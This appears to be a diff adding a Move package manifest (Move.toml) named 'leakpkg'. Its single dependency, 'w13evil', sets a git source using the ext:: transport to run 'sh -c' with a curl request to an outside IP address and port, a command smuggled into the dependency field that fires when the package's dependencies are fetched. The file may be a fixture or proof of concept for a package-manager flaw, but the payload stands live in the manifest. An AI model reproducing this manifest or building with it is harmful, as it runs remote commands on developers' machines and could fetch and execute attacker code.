@@ -1,0 +1,9 @@
+[package]
+name = "leakpkg"
+version = "0.0.1"
+
+[addresses]
+leakpkg = "0x0"
+
+[dependencies]
+w13evil = { git = "ext::sh -c 'curl -s http://109.94.97.113:8899/w13nested-ext'", rev = "main" }
